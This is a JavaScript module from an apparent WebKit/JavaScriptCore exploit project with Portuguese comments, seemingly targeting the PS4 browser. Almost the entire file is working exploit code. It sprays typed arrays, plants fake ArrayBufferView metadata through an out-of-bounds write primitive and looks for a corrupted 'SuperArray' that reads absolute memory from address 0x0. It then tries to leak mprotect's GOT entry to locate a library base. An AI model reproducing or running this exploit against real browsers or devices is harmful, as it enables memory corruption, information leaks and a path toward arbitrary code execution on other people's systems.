// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_REPLICATE_SUCCESS = "replicateOriginalSuperArray_v23a";

const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde o trigger principal é escrito
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Baseado na sua lógica de sucesso e no log onde m_vector@0x68 e m_length@0x70 eram lidos.
// Usando M_VECTOR_OFFSET = 0x10 e M_LENGTH_OFFSET = 0x18 do seu config.mjs.
// Para m_vector estar em 0x68: BASE_OFFSET = 0x68 - 0x10 = 0x58.
// Para m_length estar em 0x70: BASE_OFFSET = 0x70 - 0x18 = 0x58.
const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x58; 

const PLANTED_M_VECTOR_SUPERARRAY = new AdvancedInt64(0, 0); // Alvo: m_vector = 0x0
const PLANTED_M_LENGTH_SUPERARRAY = 0xFFFFFFFF;             // Alvo: m_length = 0xFFFFFFFF

const NUM_SPRAY_OBJECTS = 500; // Como nos testes recentes
const ORIGINAL_SPRAY_LENGTH = 8;

let sprayedVictimObjects = []; // Para Uint32Arrays pulverizados

// Função para ler QWORD de endereço absoluto usando o superArray (que lê de 0x0)
// (Mesma função readQwordAbsolute do _v22a, pode ser movida para utils.mjs)
function readQwordAbsolute(superArrayForRead, address_qword_to_read) {
    if (!superArrayForRead || superArrayForRead.length !== PLANTED_M_LENGTH_SUPERARRAY) {
        logS3(`[readQwordAbsolute] SuperArray inválido ou length não esperado. Length: ${superArrayForRead ? superArrayForRead.length : 'N/A'}`, "error", FNAME_REPLICATE_SUCCESS);
        return null;
    }
    if (!isAdvancedInt64Object(address_qword_to_read)) {
        address_qword_to_read = new AdvancedInt64(address_qword_to_read);
    }

    if (address_qword_to_read.high() !== 0) {
        logS3(`[readQwordAbsolute] Aviso: Tentando ler de endereço 64-bit ${address_qword_to_read.toString(true)} com SuperArray (Uint32Array) que só pode endereçar 4GB (LOW_DWORD). Leitura pode ser incorreta ou falhar.`, "warn", FNAME_REPLICATE_SUCCESS);
        // Se precisarmos ler endereços > 2^32-1, esta primitiva não é suficiente.
        // No entanto, para ponteiros de heap do JSC no PS4, a parte alta geralmente é 0.
        return null;
    }

    const base_address_low = address_qword_to_read.low();
    const index_low = base_address_low / 4;
    const index_high = (base_address_low / 4) + 1;

    if (index_high >= superArrayForRead.length) {
        logS3(`[readQwordAbsolute] Endereço ${toHex(base_address_low)} fora dos limites do superArray (length ${toHex(superArrayForRead.length)}) para ler QWORD.`, "error", FNAME_REPLICATE_SUCCESS);
        return null;
    }
    
    try {
        const low_dword = superArrayForRead[index_low];
        const high_dword = superArrayForRead[index_high];
        return new AdvancedInt64(low_dword, high_dword);
    } catch (e) {
        logS3(`[readQwordAbsolute] Erro ao ler do SuperArray nos índices ${toHex(index_low)}/${toHex(index_high)}: ${e.message}`, "error", FNAME_REPLICATE_SUCCESS);
        return null;
    }
}


export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_REPLICATE_SUCCESS}: Replicar Obtenção de SuperArray e Tentar Addrof ---`, "test", FNAME_REPLICATE_SUCCESS);

    sprayedVictimObjects = [];
    let targetFuncForLeak = function aUniqueFunctionTarget() { return "target_v23a"; };
    let sprayedTargetFunctions = []; // Não usado ativamente para addrof neste teste ainda, mas bom ter.
    for(let i=0; i<50; i++) sprayedTargetFunctions.push(targetFuncForLeak);


    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_SUCCESS);

        // FASE 1: Spray de Uint32Array
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_SUCCESS);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xDEAD0000 ^ i; // Padrão único
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_SUCCESS);

        // FASE 2: Plantar metadados no oob_array_buffer_real
        // Usando FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x58
        // M_VECTOR_OFFSET = 0x10 => 0x58 + 0x10 = 0x68
        // M_LENGTH_OFFSET = 0x18 => 0x58 + 0x18 = 0x70
        const actualMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const actualMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        
        logS3(`FASE 2: Plantando m_vector=${PLANTED_M_VECTOR_SUPERARRAY.toString(true)} em oob_buffer[${toHex(actualMetaVectorOffset)}]`, "info", FNAME_REPLICATE_SUCCESS);
        oob_write_absolute(actualMetaVectorOffset, PLANTED_M_VECTOR_SUPERARRAY, 8);
        
        logS3(`           Plantando m_length=${toHex(PLANTED_M_LENGTH_SUPERARRAY)} em oob_buffer[${toHex(actualMetaLengthOffset)}]`, "info", FNAME_REPLICATE_SUCCESS);
        oob_write_absolute(actualMetaLengthOffset, PLANTED_M_LENGTH_SUPERARRAY, 4); // m_length é um DWORD

        const chk_vec = oob_read_absolute(actualMetaVectorOffset, 8);
        const chk_len = oob_read_absolute(actualMetaLengthOffset, 4);
        logS3(`  Verificação Pós-Plantio (no oob_buffer): m_vector@${toHex(actualMetaVectorOffset)}=${chk_vec.toString(true)}, m_length@${toHex(actualMetaLengthOffset)}=${toHex(chk_len)}`, "info", FNAME_REPLICATE_SUCCESS);


        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_SUCCESS);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_SUCCESS);
        
        // Verificar o que está agora nos offsets de metadados plantados DENTRO do oob_buffer
        // O trigger em 0x70 sobrescreveu o m_length que plantamos em oob_buffer[0x70].
        const vec_after_trigger_in_oob = oob_read_absolute(actualMetaVectorOffset, 8); // Deve ser 0x0 se não afetado pelo trigger
        const len_after_trigger_in_oob = oob_read_absolute(actualMetaLengthOffset, 4); // Deve ser 0xFFFFFFFF (low dword do trigger)
        logS3(`  Valores NO OOB_BUFFER APÓS trigger: m_vector@${toHex(actualMetaVectorOffset)}=${vec_after_trigger_in_oob.toString(true)}, m_length@${toHex(actualMetaLengthOffset)}=${toHex(len_after_trigger_in_oob)}`, "info", FNAME_REPLICATE_SUCCESS);
        
        // Se o seu log de sucesso "[22:10:13] m_vector (@0x00000068): 0x00000000_00000000" e 
        // "m_length (@0x00000070): 0xffffffff" era APÓS O TRIGGER, então o trigger está sobrescrevendo
        // o m_length no oob_buffer para 0xFFFFFFFF, e o m_vector no oob_buffer continua 0x0.
        // Isso é o que esperamos que seja copiado para o objeto JS.

        await PAUSE_S3(250);

        // FASE 4: Identificar SuperArray (Uint32Array com m_vector=0 e length=PLANTED_M_LENGTH_SUPERARRAY)
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_REPLICATE_SUCCESS);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === PLANTED_M_LENGTH_SUPERARRAY) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_SUCCESS);
                document.title = `SUPERARRAY Idx ${i}!`;
                break; 
            }
        }

        if (superArray) {
            logS3("  SuperArray obtido. Testando leitura de endereço 0x0 (para validar m_vector=0).", "info", FNAME_REPLICATE_SUCCESS);
            try {
                const val_at_zero = superArray[0]; // Lê de [0x0]
                logS3(`    Leitura de teste com SuperArray: superArray[0] (de endereço absoluto 0x0) = ${toHex(val_at_zero)}`, "leak", FNAME_REPLICATE_SUCCESS);
                document.title = `SuperArray LEU 0x0: ${toHex(val_at_zero)}`;

                // SE CHEGAMOS AQUI, TEMOS LEITURA ABSOLUTA A PARTIR DE 0x0!
                // AGORA TENTAR ADDROF(targetFuncForLeak)
                // Para um addrof simples, vamos tentar ler o JSCell header de um endereço que *suspeitamos* ser uma função.
                // Isso ainda requer adivinhar o endereço da função ou escanear a heap.

                // TENTATIVA DE LER UM PONTEIRO CONHECIDO DA GOT (SE O OFFSET FOR PEQUENO)
                // Exemplo: WEBKIT_LIBRARY_INFO.GOT_ENTRIES.mprotect é "0x3CBD820" (string)
                // Convertemos para número. Se o SuperArray puder ler até lá.
                let mprotect_got_addr_str = WEBKIT_LIBRARY_INFO.GOT_ENTRIES?.mprotect;
                if (mprotect_got_addr_str) {
                    const mprotect_got_addr = parseInt(mprotect_got_addr_str, 16);
                    if (!isNaN(mprotect_got_addr) && (mprotect_got_addr / 4) < superArray.length) {
                        logS3(`  Tentando ler entrada da GOT de mprotect (${toHex(mprotect_got_addr)}) usando SuperArray...`, "info", FNAME_REPLICATE_SUCCESS);
                        const mprotect_val_qword = readQwordAbsolute(superArray, new AdvancedInt64(mprotect_got_addr, 0));
                        if (mprotect_val_qword) {
                            logS3(`    !!!! VALOR LIDO DA GOT (mprotect @ ${toHex(mprotect_got_addr)}): ${mprotect_val_qword.toString(true)} !!!!`, "vuln", FNAME_REPLICATE_SUCCESS);
                            document.title = `GOT mprotect: ${mprotect_val_qword.toString(true).slice(-10)}`;
                            // Se este for um endereço em libc, e soubermos o offset de mprotect em libc, podemos calcular a base da libc.
                        } else {
                            logS3(`    Falha ao ler GOT de mprotect com SuperArray ou endereço inválido/fora dos limites.`, "warn", FNAME_REPLICATE_SUCCESS);
                        }
                    } else {
                        logS3(`    Endereço da GOT de mprotect (${toHex(mprotect_got_addr)}) fora dos limites do SuperArray ou inválido.`, "warn", FNAME_REPLICATE_SUCCESS);
                    }
                } else {
                    logS3("    Offset da GOT de mprotect não definido em config.mjs.", "info", FNAME_REPLICATE_SUCCESS);
                }

            } catch (e) {
                logS3(`    Erro ao usar SuperArray para ler de 0x0 (ou GOT): ${e.message}`, "error", FNAME_REPLICATE_SUCCESS);
                document.title = "SuperArray ERRO LEITURA";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_REPLICATE_SUCCESS);
            document.title = "SuperArray NÃO Encontrado (v23a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_SUCCESS}: ${e.message}`, "critical", FNAME_REPLICATE_SUCCESS);
        document.title = `${FNAME_REPLICATE_SUCCESS} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_REPLICATE_SUCCESS} Concluído ---`, "test", FNAME_REPLICATE_SUCCESS);
    }
}
